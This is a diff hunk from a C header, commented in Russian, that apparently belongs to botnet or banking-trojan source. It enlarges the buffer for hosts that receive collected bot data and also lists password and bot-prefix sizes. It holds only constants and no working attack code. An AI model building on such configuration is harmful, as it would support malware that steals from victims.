@@ -36,7 +36,7 @@
 
 // Максимальные размеры массивов с данными
 #define MAX_MAINHOSTS_BUF_SIZE 500 /* Размер буфера хранения ссылок */
-#define MAX_BANKHOSTS_BUF_SIZE 128 /* размер буфера хранения хостов отправки кабов */
+#define MAX_BANKHOSTS_BUF_SIZE 500 /* размер буфера хранения хостов отправки кабов */
 #define MAX_PASSWORD_SIZE      32  /* Размер буфера хранения основного пароля */
 #define MAX_PREFIX_SIZE        20  /* Размер буфера для префикса бота */
 #define MAX_DELAY_SIZE         8   /* Буфер для хранения задержки */
